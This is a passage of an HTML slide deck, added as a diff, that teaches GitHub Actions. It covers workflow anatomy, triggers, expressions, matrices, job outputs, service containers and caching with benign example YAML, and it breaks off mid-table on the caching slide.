@@ -1,0 +1,1623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Introduction to GitHub Actions</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@400;500;600;700&family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400;1,700&family=Overpass+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/theme/white.min.css">
+<style>
+  :root {
+    --amber:  #af7e0f;
+    --green:  #217566;
+    --purple: #4e4392;
+    --blue:   #204d89;
+    --red:    #bb2233;
+    --bg:     #eaeff2;
+    --bg2:    #e1e8ec;
+    --bg3:    #d9e1e6;
+    --border: #b9c7d0;
+    --text:   #14273b;
+    --muted:  #5c6e7b;
+  }
+
+  .reveal-viewport { background: var(--bg); }
+  .reveal .slides section { background: transparent; }
+
+  .reveal { font-family: 'Public Sans', sans-serif; color: var(--text); }
+  .reveal h1, .reveal h2, .reveal h3 { font-family: 'Big Shoulders Display', serif; font-weight: 700; }
+  .reveal h1 { font-size: 1.6em; color: var(--amber); line-height: 1.1; }
+  .reveal h2 { font-size: 1.1em; color: var(--amber); margin-bottom: .2em; }
+  .reveal h3 { font-size: .78em; color: var(--green); margin-bottom: .15em; }
+  .reveal p  { font-size: .56em; line-height: 1.45; color: var(--text); }
+  .reveal li { font-size: .54em; line-height: 1.45; margin-bottom: .1em; }
+  .reveal code { font-family: 'Overpass Mono', monospace; font-size: .72em; }
+  .reveal pre  { box-shadow: none; background: var(--bg3); border: 1px solid var(--border);
+                 border-radius: 6px; padding: .3em .5em; margin: .25em 0; }
+  .reveal pre code { font-size: .52em; line-height: 1.35; background: transparent; color: #213343; }
+
+  /* ── slide chrome ── */
+  .slide-hdr {
+    display: flex; align-items: center; gap: .4em;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: .2em; margin-bottom: .3em;
+  }
+  .slide-hdr .tag {
+    font-family: 'Overpass Mono', monospace;
+    font-size: .42em; font-weight: 500;
+    color: var(--bg); background: var(--amber);
+    padding: .1em .4em; border-radius: 3px;
+    letter-spacing: .04em;
+  }
+  .slide-hdr h2 { margin: 0; font-size: .95em; }
+
+  /* ── two-column ── */
+  .cols   { display: grid; gap: .5em; }
+  .cols-2 { grid-template-columns: 1fr 1fr; }
+  .cols-3 { grid-template-columns: 1fr 1fr 1fr; }
+  .cols-6040 { grid-template-columns: 6fr 4fr; }
+  .cols-4060 { grid-template-columns: 4fr 6fr; }
+
+  /* ── cards ── */
+  .card {
+    background: var(--bg2); border: 1px solid var(--border);
+    border-radius: 6px; padding: .35em .6em;
+  }
+  .card.amber { border-left: 3px solid var(--amber); }
+  .card.green { border-left: 3px solid var(--green); }
+  .card.purple{ border-left: 3px solid var(--purple); }
+  .card.blue  { border-left: 3px solid var(--blue); }
+  .card.red   { border-left: 3px solid var(--red); }
+  .card h3 { font-size: .64em; margin: 0 0 .12em; }
+  .card p  { font-size: .52em; margin: 0; color: #354552; }
+  .card ul { margin: 0; padding-left: 1em; }
+  .card li { font-size: .52em; color: #354552; margin-bottom: .02em; }
+
+  /* ── table ── */
+  .reveal table { width: 100%; border-collapse: collapse; font-size: .5em; }
+  .reveal table th { background: var(--bg3); color: var(--amber); font-weight: 600;
+                     padding: .2em .4em; border: 1px solid var(--border); text-align: left; }
+  .reveal table td { padding: .18em .4em; border: 1px solid var(--border); color: #283948; }
+  .reveal table tr:nth-child(even) td { background: #e3eaee; }
+
+  /* ── accent spans ── */
+  .a  { color: var(--amber); font-weight: 600; }
+  .g  { color: var(--green); font-weight: 600; }
+  .p  { color: var(--purple); font-weight: 600; }
+  .b  { color: var(--blue); font-weight: 600; }
+  .r  { color: var(--red); font-weight: 600; }
+  .mono { font-family: 'Overpass Mono', monospace; }
+
+  /* ── SVG graph diagrams ── */
+  svg.diagram { display: block; margin: 0 auto; overflow: visible; }
+
+  /* ── pill badges ── */
+  .pill {
+    display: inline-block; font-family: 'Overpass Mono', monospace;
+    font-size: .44em; padding: .08em .4em; border-radius: 99px;
+    border: 1px solid; margin: 0 .08em;
+  }
+  .pill.amber { color: var(--amber); border-color: var(--amber); }
+  .pill.green { color: var(--green); border-color: var(--green); }
+  .pill.purple{ color: var(--purple); border-color: var(--purple); }
+  .pill.blue  { color: var(--blue); border-color: var(--blue); }
+
+  /* ── footer — hidden; was overlapping scrollable content ── */
+  .reveal .slide-footer { display: none; }
+  /* title slide special */
+  .title-slide h1 { font-size: 1.8em; }
+  .title-slide .subtitle {
+    font-size: .7em; color: var(--green); font-family: 'Public Sans', sans-serif;
+    font-weight: 300; letter-spacing: .04em; margin: .3em 0 .6em;
+  }
+  .title-slide .meta { font-size: .48em; color: var(--muted); font-family: 'Overpass Mono', monospace; }
+
+  /* ── super-step animator ── */
+  .ss-row {
+    display: flex; gap: .25em; align-items: center;
+    margin: .1em 0; font-size: .55em; font-family: 'Overpass Mono', monospace;
+  }
+  .ss-node {
+    padding: .2em .55em; border-radius: 5px; font-size: .9em;
+    background: var(--bg3); border: 1px solid var(--border); color: var(--text);
+  }
+  .ss-node.active { background: #c4d4d1; border-color: var(--green); color: var(--green); }
+  .ss-node.done   { background: #d4dde4; border-color: var(--purple); color: var(--purple); }
+  .ss-arrow { color: var(--amber); }
+  .ss-label { font-size: .8em; color: var(--muted); margin-left: .3em; }
+
+  /* reduce default margins */
+  .reveal ul, .reveal ol { margin: .15em 0 .15em 1em; }
+.reveal .slides > section { display: flex !important; flex-direction: column !important; overflow-y: auto !important; align-items: stretch !important; justify-content: flex-start !important; }
+
+  /* ── screenshots and captions ── */
+  .shot { display: block; width: 100%; height: auto; border: 1px solid var(--border); border-radius: 6px; margin: .15em 0; }
+  .reveal p.cap { font-size: .4em; color: var(--muted); line-height: 1.35; margin: .2em 0 .3em; }
+  .reveal a { color: var(--blue); }
+  .reveal pre code { font-size: .46em; max-height: none; }
+  .reveal h3 .pill { vertical-align: middle; }
+  .dense .card li, .dense .card p, .dense p.cap { font-size: .44em; }
+  .dense .card h3 { font-size: .58em; }
+  .dense .card { padding: .25em .5em; }
+  .dense h3 { font-size: .6em; }
+  .reveal pre code { white-space: pre-wrap !important; }
+  .code-sm pre code { font-size: .4em; }
+  .code-xs pre code { font-size: .36em; }
+  .reveal p.term { font-size: .42em; color: var(--muted); line-height: 1.35; margin: .1em 0; }
+  .reveal p.term b { color: var(--text); }
+  .reveal table.tight { font-size: .4em; }
+  .reveal table.tight td, .reveal table.tight th { padding: .12em .35em; }
+  .cols > div { min-width: 0; }
+  .shot.half { max-width: 100%; }
+  .reveal pre code { overflow-wrap: anywhere; }
+  .card.dense li, .card.dense p { font-size: .44em; }
+  .cols > div > h3 { font-size: .56em; margin: .1em 0 .15em; }
+  .run { font-family: 'Overpass Mono', monospace; font-size: .9em; }
+</style>
+<style>.reveal .slide-number{background-color:transparent}</style>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+
+
+<!-- ═══════════════════════════════ SLIDE 01 — TITLE ═══════════════════════════════ -->
+<section class="title-slide" data-background-color="#eaeff2">
+  <div style="text-align:left; max-width:820px; margin:0 auto; padding: 1em 0;">
+    <div style="font-family:'Overpass Mono',monospace; font-size:.5em; color:var(--muted); margin-bottom:.4em; letter-spacing:.1em;">
+      TECHNICAL PRESENTATION
+    </div>
+    <h1>Introduction to<br>GitHub Actions</h1>
+    <div class="subtitle">Write, debug, secure and speed up workflows, from the first YAML file to a protected main branch</div>
+    <div style="width:60px; height:3px; background:var(--amber); margin-bottom:1.4em;"></div>
+    <div style="display:flex; gap:1.2em; flex-wrap:wrap; margin-bottom:1em;">
+      <span class="pill amber">CI/CD</span>
+      <span class="pill green">Workflows</span>
+      <span class="pill purple">Security</span>
+      <span class="pill blue">Rulesets</span>
+    </div>
+    <div class="ss-row" style="margin-top:0.6em; flex-wrap:wrap;">
+      <span class="ss-node active">🔔 Event</span>
+      <span class="ss-arrow">→</span>
+      <span class="ss-node active">📄 Workflow</span>
+      <span class="ss-arrow">→</span>
+      <span class="ss-node active">🧱 Jobs</span>
+      <span class="ss-arrow">→</span>
+      <span class="ss-node done">🪜 Steps</span>
+      <span class="ss-arrow">→</span>
+      <span class="ss-node done">✅ Checks</span>
+    </div>
+    <p style="max-width:640px; color:#475865; font-size:.56em; line-height:1.5; margin-top:1em;">
+      Every workflow in this deck ran for real on GitHub, in <a href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions">this repository's Actions tab</a>, and the run IDs are linked from the slides
+    </p>
+    <div class="meta" style="margin-top:1.4em;">
+      Triggers &nbsp;·&nbsp; Matrices &nbsp;·&nbsp; Caching &nbsp;·&nbsp; Reuse &nbsp;·&nbsp; Security &nbsp;·&nbsp; Rulesets
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 02 — TOPICS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">01</span>
+    <h2>Topics</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber">
+        <h3 class="a">Writing Workflows</h3>
+        <ul>
+          <li>Events, workflows, jobs, steps and runners</li>
+          <li>The workflow file, line by line; triggers</li>
+          <li>Expressions, contexts and <code>if:</code> conditions</li>
+          <li>Matrices, job outputs, service containers</li>
+        </ul>
+      </div>
+      <div class="card green" style="margin-top:0.5em;">
+        <h3 class="g">Making Them Fast and Reusable</h3>
+        <ul>
+          <li>Caching, artifacts, job summaries, annotations</li>
+          <li>Composite actions and reusable workflows</li>
+          <li>Writing a JavaScript or Docker action</li>
+          <li>Cost, limits, concurrency groups, path filters</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <div class="card purple">
+        <h3 class="p">Making Them Safe</h3>
+        <ul>
+          <li>A least-privilege <code>GITHUB_TOKEN</code></li>
+          <li>Secrets, environments and protection rules</li>
+          <li>OIDC, pinning by SHA, Dependabot</li>
+          <li><code>pull_request_target</code> and script injection</li>
+        </ul>
+      </div>
+      <div class="card blue" style="margin-top:0.5em;">
+        <h3 class="b">Running Them for Real</h3>
+        <ul>
+          <li>Debugging, and real failures from this GitHub</li>
+          <li>Protecting <code>main</code>: rulesets and required checks</li>
+          <li>Quality gates beyond tests: Lighthouse CI</li>
+          <li>Real workflows; Actions vs Jenkins vs GitLab CI</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <p class="cap" style="margin-top:.6em;">Each new term is defined in plain words the first time it appears, and listed with its slide in the README's <a href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions#key-terms">Key terms</a>.</p>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 03 — WHAT IT IS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">02</span>
+    <h2>What GitHub Actions Is, and Where Jobs Run</h2>
+  </div>
+  <p>GitHub Actions is the automation system built into GitHub. Something happens in a repository, and GitHub runs the YAML files you keep in <code>.github/workflows/</code> on machines it provides or that you provide.</p>
+  <div class="cols cols-6040">
+    <div>
+      <svg class="diagram" viewBox="0 0 560 300" width="100%" role="img" aria-label="An event starts a workflow; the workflow's jobs run in parallel on runners; each job is a list of steps">
+        <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#5c6e7b"/></marker></defs>
+        <rect x="6" y="120" width="96" height="60" rx="8" fill="#e1e8ec" stroke="#af7e0f" stroke-width="2"/>
+        <text x="54" y="146" text-anchor="middle" fill="#af7e0f" font-size="15" font-weight="700">Event</text>
+        <text x="54" y="166" text-anchor="middle" fill="#5c6e7b" font-size="11">push, PR, cron…</text>
+        <path d="M104,150 L134,150" stroke="#5c6e7b" stroke-width="1.5" fill="none" marker-end="url(#arr)"/>
+        <rect x="138" y="10" width="416" height="282" rx="8" fill="#e1e8ec" stroke="#217566" stroke-width="1.5"/>
+        <text x="152" y="34" fill="#217566" font-size="15" font-weight="700">Workflow run (one YAML file)</text>
+        <rect x="152" y="50" width="186" height="110" rx="6" fill="#d9e1e6" stroke="#4e4392"/>
+        <text x="164" y="72" fill="#4e4392" font-size="13" font-weight="700">Job: test</text>
+        <text x="164" y="94" fill="#14273b" font-size="12">step: uses checkout</text>
+        <text x="164" y="114" fill="#14273b" font-size="12">step: uses setup-python</text>
+        <text x="164" y="134" fill="#14273b" font-size="12">step: run pytest</text>
+        <text x="164" y="152" fill="#5c6e7b" font-size="11">on runner ubuntu-24.04</text>
+        <rect x="152" y="172" width="186" height="110" rx="6" fill="#d9e1e6" stroke="#4e4392"/>
+        <text x="164" y="194" fill="#4e4392" font-size="13" font-weight="700">Job: lint</text>
+        <text x="164" y="216" fill="#14273b" font-size="12">step: uses checkout</text>
+        <text x="164" y="236" fill="#14273b" font-size="12">step: run ruff check</text>
+        <text x="164" y="274" fill="#5c6e7b" font-size="11">another fresh runner</text>
+        <rect x="372" y="110" width="168" height="92" rx="6" fill="#d9e1e6" stroke="#204d89"/>
+        <text x="384" y="132" fill="#204d89" font-size="13" font-weight="700">Job: report</text>
+        <text x="384" y="154" fill="#14273b" font-size="12">needs: [test, lint]</text>
+        <text x="384" y="174" fill="#14273b" font-size="12">step: download artifacts</text>
+        <text x="384" y="192" fill="#5c6e7b" font-size="11">starts after both pass</text>
+        <path d="M340,105 L368,140" stroke="#5c6e7b" stroke-width="1.5" fill="none" marker-end="url(#arr)"/>
+        <path d="M340,227 L368,172" stroke="#5c6e7b" stroke-width="1.5" fill="none" marker-end="url(#arr)"/>
+      </svg>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <ul>
+          <li><span class="a">Event</span>: something that happens (a push, a pull request, a schedule, a button press) and can start workflows</li>
+          <li><span class="a">Workflow</span>: one YAML file in <code>.github/workflows/</code>; each time it starts is a <span class="a">run</span></li>
+          <li><span class="a">Job</span>: a group of steps that runs on one fresh machine. Jobs run in parallel unless one <code>needs</code> another</li>
+          <li><span class="a">Step</span>: one shell command (<code>run</code>) or one packaged <span class="a">action</span> (<code>uses</code>)</li>
+          <li><span class="a">Runner</span>: the machine that runs a job</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <table class="tight" style="margin-top:.4em;">
+    <thead><tr><th>Runner kind</th><th>What it is</th><th>Use it when</th></tr></thead>
+    <tbody>
+      <tr><td><span class="g">GitHub-hosted</span> (standard)</td><td>a fresh VM per job, deleted afterwards: <code>ubuntu-24.04</code>, <code>windows-latest</code>, <code>macos-latest</code>…</td><td>almost always; free on public repos</td></tr>
+      <tr><td><span class="b">Larger runners</span></td><td>GitHub-hosted, with more CPU, memory or disk, a GPU or a static IP; Team and Enterprise plans, always billed per minute</td><td>builds are too slow or too big for standard ones</td></tr>
+      <tr><td><span class="p">Self-hosted</span></td><td>your own machine running the runner agent, picked by <span class="p">labels</span> (<code>runs-on: [self-hosted, linux, fpga]</code>)</td><td>special hardware, licensed tools, private networks. Don't attach one to a public repo: a pull request from a <span class="p">fork</span> (someone's copy of the repo) could run code on it</td></tr>
+    </tbody>
+  </table>
+  <p class="cap">Every demo here used standard GitHub-hosted Ubuntu runners. See <a href="https://docs.github.com/en/actions/concepts/runners">About runners</a>.</p>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 04 — ANATOMY ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">03</span>
+    <h2>Anatomy of a Workflow File</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+env:
+  PIP_DISABLE_PIP_VERSION_CHECK: "1"
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  gate:
+    name: Demo gate
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+        with:
+          python-version: "3.12"
+      - run: pip install -r demo/requirements.txt
+      - name: Tests (report skips with -rs)
+        run: pytest -rs demo</code></pre>
+      <p class="cap"><code>.github/workflows/ci.yml</code> in this repo: the check that guards <code>main</code> (slide 20). A <span class="a">check</span> is the pass/fail mark GitHub shows on a commit or pull request; each job reports one. Green on push, <a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324600">run 37214324600</a>.</p>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <h3 class="a">Top level</h3>
+        <ul>
+          <li><code>name</code>: the label in the Actions tab</li>
+          <li><code>on</code>: which <span class="a">events</span> start it, with filters</li>
+          <li><code>permissions</code>: what the job's automatic token may do (slide 12)</li>
+          <li><code>env</code>: environment variables for every step</li>
+          <li><code>defaults.run</code>: default shell and working directory for <code>run</code> steps</li>
+        </ul>
+      </div>
+      <div class="card green" style="margin-top:.35em;">
+        <h3 class="g">Per job</h3>
+        <ul>
+          <li><code>jobs.&lt;id&gt;</code>: the job's ID; <code>name</code> is what reviewers and rulesets see</li>
+          <li><code>runs-on</code>: the runner label</li>
+          <li><code>timeout-minutes</code>: kill it if it hangs (default 360)</li>
+          <li><code>steps</code>: run in order; a failing step stops the job</li>
+        </ul>
+      </div>
+      <div class="card purple" style="margin-top:.35em;">
+        <h3 class="p"><code>uses</code> vs <code>run</code></h3>
+        <ul>
+          <li><code>uses: owner/repo@ref</code> runs an <span class="p">action</span>: packaged, reusable code from another repo (or <code>./path</code> in this one)</li>
+          <li><code>with</code>: the action's inputs</li>
+          <li><code>run</code>: a shell script on the runner</li>
+          <li>The long hex after <code>@</code> is a commit SHA: pinning, slide 14</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 05 — TRIGGERS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">04</span>
+    <h2>Triggers: What Starts a Workflow</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">on:
+  push:
+    branches: [main, "release/**"]
+    paths-ignore: ["**.md"]
+  pull_request:
+    types: [opened, synchronize, reopened]
+  schedule:
+    - cron: "17 3 * * 1-5"      # 03:17 UTC on weekdays
+  workflow_dispatch:
+    inputs:
+      level:
+        type: choice
+        options: [quick, full]
+  workflow_call:
+    inputs:
+      python-version:
+        type: string
+        default: "3.12"</code></pre>
+      <p class="cap"><code>demo/lint_examples/triggers.yml</code>: every common trigger in one file, checked with <code>actionlint</code> (clean). Each trigger also ran for real in a workflow of its own (right).</p>
+    </div>
+    <div class="dense">
+      <table class="tight">
+        <thead><tr><th>Trigger</th><th>Starts a run when…</th><th>Ran here</th></tr></thead>
+        <tbody>
+          <tr><td><code>push</code></td><td>commits land on a branch or tag; <code>branches</code> / <code>paths</code> filters narrow it</td><td><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324600">run 37214324600</a></td></tr>
+          <tr><td><code>pull_request</code></td><td>a pull request (PR) is opened or updated; runs on the PR's merge commit, read-only for forks</td><td><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214705396">run 37214705396</a></td></tr>
+          <tr><td><code>schedule</code></td><td>a cron time in UTC; may start late under load</td><td>linted only (not waited for)</td></tr>
+          <tr><td><code>workflow_dispatch</code></td><td>someone presses <i>Run workflow</i> or calls the API, with typed <span class="a">inputs</span></td><td><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214439700">run 37214439700</a></td></tr>
+          <tr><td><code>workflow_call</code></td><td>another workflow calls this one (slide 10)</td><td><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324885">run 37214324885</a></td></tr>
+        </tbody>
+      </table>
+      <pre style="margin-top:.4em;"><code class="language-yaml">on:
+  workflow_dispatch:
+    inputs:
+      level:
+        description: How much to run
+        type: choice
+        options: [quick, full]
+        default: quick
+      dry_run:
+        description: Print the plan only
+        type: boolean
+        default: true
+      note:
+        description: Free text (treated as untrusted)
+        type: string
+        default: hello</code></pre>
+      <p class="cap">Started with <code>gh workflow run demo-dispatch.yml -f level=full -f dry_run=false</code>. Inputs arrive as the <code>inputs</code> context.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 06 — EXPRESSIONS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">05</span>
+    <h2>Expressions, Contexts and Conditions</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <p style="margin-top:0;">An <span class="a">expression</span> is <code>${{ … }}</code>: GitHub evaluates it before the step runs. A <span class="a">context</span> is a named object it can read.</p>
+      <table class="tight">
+        <thead><tr><th>Context</th><th>Holds</th></tr></thead>
+        <tbody>
+          <tr><td><code>github</code></td><td>the event and run: <code>event_name</code>, <code>ref_name</code>, <code>sha</code>, <code>actor</code>, <code>event.*</code></td></tr>
+          <tr><td><code>env</code></td><td>variables set with <code>env:</code></td></tr>
+          <tr><td><code>matrix</code></td><td>this leg's matrix values (slide 06)</td></tr>
+          <tr><td><code>secrets</code></td><td>encrypted secrets (slide 13)</td></tr>
+          <tr><td><code>needs</code></td><td>results and outputs of jobs this one needs</td></tr>
+          <tr><td><code>steps</code></td><td>earlier steps' <code>outputs</code>, <code>outcome</code>, <code>conclusion</code> (by step <code>id</code>)</td></tr>
+          <tr><td><code>inputs</code>, <code>runner</code>, <code>vars</code></td><td>dispatch/call inputs; the runner's OS and temp dir; plain config variables</td></tr>
+        </tbody>
+      </table>
+      <div class="card amber" style="margin-top:.4em;">
+        <p><code>if:</code> skips a step or job unless its expression is true. With no status function, <code>if:</code> implies <code>success()</code>: "everything before me passed". <code>failure()</code> = something earlier failed; <code>always()</code> = run regardless (clean-up, reports); <code>cancelled()</code> = the run was cancelled.</p>
+      </div>
+    </div>
+    <div>
+      <pre><code class="language-yaml">status:
+  needs: [prepare, service]
+  runs-on: ubuntu-24.04
+  steps:
+    - id: flaky
+      name: A step allowed to fail
+      continue-on-error: true
+      run: exit 3
+    - name: Runs only because the step above failed
+      if: steps.flaky.outcome == 'failure'
+      run: echo "outcome=${{ steps.flaky.outcome }} conclusion=${{ steps.flaky.conclusion }}"
+    - name: Skipped, because the job has not failed
+      if: failure()
+      run: echo "never printed"
+    - name: Always runs (clean-up)
+      if: always()
+      run: echo "event=${{ github.event_name }} actor=${{ github.actor }} ref=${{ github.ref_name }}"</code></pre>
+      <pre><code class="language-text">outcome=failure conclusion=success
+##[debug]Evaluating: failure()
+##[debug]=&gt; false
+##[debug]Evaluating: always()
+##[debug]=&gt; true
+event=push actor=BrendanJamesLynskey ref=main</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324637">run 37214324637</a> (debug re-run, attempt 2). <code>continue-on-error</code> makes a failed step's <span class="a">outcome</span> <code>failure</code> but its <span class="a">conclusion</span> <code>success</code>, so the job stays green and <code>failure()</code> is false.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 07 — MATRICES ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">06</span>
+    <h2>Matrices: One Job, Many Combinations</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">test:
+  name: test (py${{ matrix.python }}, ${{ matrix.os }})
+  runs-on: ${{ matrix.os }}
+  timeout-minutes: 10
+  strategy:
+    fail-fast: false
+    max-parallel: 3
+    matrix:
+      os: [ubuntu-24.04, ubuntu-22.04]
+      python: ["3.10", "3.12", "3.13"]
+      exclude:
+        - os: ubuntu-22.04
+          python: "3.13"
+      include:
+        - os: ubuntu-24.04
+          python: "3.13"
+          coverage: true</code></pre>
+      <div class="card amber dense">
+        <ul>
+          <li>A <span class="a">matrix</span> runs the job once per combination of the listed values: 2 OSes × 3 Pythons = 6 <span class="a">legs</span></li>
+          <li><code>exclude</code> removes a combination (now 5); <code>include</code> adds keys to a matching leg (here <code>coverage: true</code>) or adds a new leg</li>
+          <li><code>fail-fast: false</code>: one red leg doesn't cancel the others (the default is <code>true</code>)</li>
+          <li><code>max-parallel: 3</code>: at most three legs at once</li>
+          <li>Each leg is its own check, named from <code>name:</code>, e.g. <code>test (py3.10, ubuntu-22.04)</code>. Without a <code>name:</code> GitHub appends the values: <code>test (3.10)</code></li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <img class="shot" src="images/matrix_run.png" alt="Run summary of the matrix demo: the Matrix test box shows 5 jobs completed, then the report job; one notice annotation">
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214874461">run 37214874461</a>: five legs, then <code>report</code>, which <code>needs</code> them. The notice comes from the <code>coverage</code> leg's <code>::notice</code> (slide 09). Screenshot as a logged-out visitor sees it.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 08 — JOBS TOGETHER ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">07</span>
+    <h2>Jobs Together: needs, Outputs and Service Containers</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">jobs:
+  prepare:
+    runs-on: ubuntu-24.04
+    outputs:
+      stamp: ${{ steps.s.outputs.stamp }}
+    steps:
+      - id: s
+        run: echo "stamp=$(date -u +%Y%m%dT%H%M%S)-${GITHUB_SHA::7}" &gt;&gt; "$GITHUB_OUTPUT"
+
+  service:
+    needs: prepare
+    runs-on: ubuntu-24.04
+    services:
+      redis:
+        image: redis:7-alpine
+        ports: ["6379:6379"]
+        options: &gt;-
+          --health-cmd "redis-cli ping"
+          --health-interval 5s
+          --health-timeout 3s
+          --health-retries 5
+    steps:
+      - name: Talk to the service container
+        run: |
+          python3 - &lt;&lt;'PY'
+          import socket
+          s = socket.create_connection(("localhost", 6379), timeout=5)
+          s.sendall(b"PING\r\n")
+          reply = s.recv(64)
+          print("redis replied", reply)
+          assert reply == b"+PONG\r\n"
+          PY
+      - run: echo "stamp from prepare = ${{ needs.prepare.outputs.stamp }}"</code></pre>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <h3 class="a">needs and outputs</h3>
+        <ul>
+          <li><code>needs: prepare</code> makes <code>service</code> wait for <code>prepare</code> and skip if it fails</li>
+          <li>A step writes <code>name=value</code> to the file <code>$GITHUB_OUTPUT</code>; the job re-exports it under <code>outputs:</code>; later jobs read <code>needs.prepare.outputs.stamp</code></li>
+          <li>Jobs share no disk: pass small values as outputs, files as artifacts (slide 09)</li>
+        </ul>
+      </div>
+      <div class="card green" style="margin-top:.35em;">
+        <h3 class="g">Service containers</h3>
+        <ul>
+          <li>A <span class="g">service container</span> is a Docker container (a database, a cache) that runs beside the job for its lifetime</li>
+          <li><code>ports</code> maps it to <code>localhost</code>; <code>--health-cmd</code> makes the job wait until it is ready</li>
+          <li>Linux runners only</li>
+        </ul>
+      </div>
+      <pre style="margin-top:.35em;"><code class="language-text">redis replied b'+PONG\r\n'
+stamp from prepare = 20261004T154736-f592127</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324637">run 37214324637</a>. The transformer explainer's real CI starts Postgres the same way for its end-to-end and Lighthouse jobs (slide 21).</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 09 — CACHING ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">08</span>
+    <h2>Caching: Don't Rebuild What Hasn't Changed</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">- uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+  with:
+    python-version: ${{ matrix.python }}
+    cache: pip
+    cache-dependency-path: demo/requirements.txt
+- name: Cache the generated dataset
+  id: data
+  uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
+  with:
+    path: .cache/data
+    key: data-${{ runner.os }}-${{ hashFiles('demo/make_data.py') }}
+- name: Build the dataset (only on a cache miss)
+  if: steps.data.outputs.cache-hit != 'true'
+  run: python demo/make_data.py .cache/data</code></pre>
+      <div class="card amber dense">
+        <ul>
+          <li>A <span class="a">cache</span> saves a directory at the end of a job and restores it at the start of a later one, looked up by a <span class="a">key</span></li>
+          <li>Build the key from what the contents depend on: <code>hashFiles(…)</code> changes when the file does, so the cache invalidates itself</li>
+          <li><code>setup-python</code> (and <code>setup-node</code>, <code>setup-go</code>…) cache package downloads with one line: <code>cache: pip</code></li>
+          <li><code>steps.&lt;id&gt;.outputs.cache-hit</code> lets you skip the expensive step</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <table class="tight">
+        <thead><tr><th>Run</th><th>Dataset cache</th><th>pip cache</th></tr></thead>
+        <tbody>
